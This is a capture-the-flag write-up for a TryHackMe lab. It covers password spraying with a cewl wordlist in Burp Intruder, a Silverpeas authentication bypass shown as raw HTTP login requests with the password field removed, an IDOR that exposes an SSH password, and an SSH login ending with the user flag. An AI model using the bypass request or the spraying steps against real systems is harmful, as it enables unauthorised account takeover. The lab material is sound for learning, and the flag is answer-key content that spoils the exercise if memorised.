# Password Spraying Attacks using BurpSuitePro

I'll be using BurpSuitePro in this instance with intruder 

First Generating a Custom Wordlist with a help of tool named cewl

```bash
ashu㉿kali ~/TryHackMe/SilverPlatter cewl http://silverplatter.thm > custom_passwords.txt

ashu㉿kali ~/TryHackMe/SilverPlatter ls
custom_passwords.txt  vhost-fuzzer.sh

ashu㉿kali ~/TryHackMe/SilverPlatter cat custom_passwords.txt
──────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: custom_passwords.txt
───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ CeWL 6.2.1 (More Fixes) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
   2   │ the
   3   │ Item
   4   │ and
   5   │ Hack
   6   │ Smarter
   7   │ Security
   8   │ this
   9   │ adipiscing
  10   │ Default
  11   │ for
  12   │ you
  13   │ integer
  14   │ aliquet
  15   │ Tyler
  16   │ Heading
  17   │ Level
  18   │ felis
  19   │ faucibus
  20   │ with
  21   │ our
  22   │ that
  23   │ This
  24   │ accumsan
  25   │ lorem
  26   │ Dolor
  27   │ pulvinar
  28   │ etiam
  29   │ Felis
  30   │ enim
  31   │ feugiat
  32   │ Ante
  33   │ turpis
  34   │ porttitor
  35   │ arcu
  36   │ skills
  37   │ Intro
  38   │ Work
  39   │ About
  40   │ Contact
  41   │ Elements
  42   │ digital
  43   │ Ramsbey
  44   │ basement
  45   │ where
  46   │ hacking
  47   │ try
  48   │ hard
  49   │ tempus
  50   │ ipsum

```

## Using Intruder Tab to spray the passwords on with Intercept On

- By Filtering the response length I think this is the password 

![[Pasted image 20250222194535.png]]

Let's Try Logging In 

![[Pasted image 20250222194756.png]]

Got Logged In 


# Exploiting a vulnerability of Authentication Bypass with a CVE 


## Exploit Title: Silverpeas CRM - Authentication Bypass
https://gist.github.com/ChrisPritchard/4b6d5c70d9329ef116266a6c238dcb2d

Silverpeas up to and including 6.3.4 is vulnerable to a trivial authentication bypass. When authenticating, if the sender omits the password form field, the application will sign you in as the user specified without any challenge.

E.g. the standard login request will look like this:

```
POST /silverpeas/AuthenticationServlet HTTP/2
Host: 212.129.58.88
Content-Length: 28
Origin: https://212.129.58.88
Content-Type: application/x-www-form-urlencoded

Login=SilverAdmin&Password=SilverAdmin&DomainId=0
```

This will fail login (unless they have forgotten to change the default password) and you will be redirected back to the login page with an error code.

But if you remove the password field like this:

```
POST /silverpeas/AuthenticationServlet HTTP/2
Host: 212.129.58.88
Content-Length: 28
Origin: https://212.129.58.88
Content-Type: application/x-www-form-urlencoded

Login=SilverAdmin&DomainId=0
```

Then the login attempt will (usually) succeed and redirect you to the main page, now logged in as a super admin.

The bug works with any valid user, but SilverAdmin is the default super admin.

## Gaining Access Through IDOR

When Logging in to silver peas i found a notification and when i open the notification it open up a link with a parameter ID=5 after changing it to 6 I found this message that contains ssh password

![[Pasted image 20250222233355.png]]


# Logging into SSH

Got successfully logged into user tim's shell with the password found above and now for escalating the privileges
```bash
ashu㉿kali ~/TryHackMe/SilverPlatter ssh tim@silverplatter.thm
tim@silverplatter.thm's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Feb 22 06:19:25 PM UTC 2025

  System load:  0.0126953125      Processes:                125
  Usage of /:   89.9% of 8.33GB   Users logged in:          0
  Memory usage: 53%               IPv4 address for docker0: 172.17.0.1
  Swap usage:   0%                IPv4 address for ens5:    10.10.254.117

  => / is using 89.9% of 8.33GB

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

39 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Wed Dec 13 16:33:12 2023 from 192.168.1.20
tim@silver-platter:~$ ls
user.txt
tim@silver-platter:~$ cat user.txt 
THM{c4ca4238a0b923820dcc509a6f75849b}
tim@silver-platter:~$ 


```

